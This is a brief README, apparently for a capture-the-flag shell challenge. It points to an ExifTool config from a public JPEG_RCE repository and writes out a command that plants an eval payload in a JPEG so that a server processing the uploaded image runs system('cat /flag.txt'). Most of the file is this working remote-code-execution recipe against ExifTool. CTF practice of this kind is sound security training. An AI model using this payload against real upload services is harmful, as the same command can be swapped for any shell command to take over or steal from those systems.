# Shell challenge resources

- **eval.config** — ExifTool config for RCE (from [JPEG_RCE](https://github.com/OneSecCyber/JPEG_RCE)). Use with a JPEG:  
  `exiftool -config eval.config runme.jpg -eval='system("cat /flag.txt")'`
- Create or use any small JPEG as `runme.jpg` in this folder when running exiftool locally before upload.
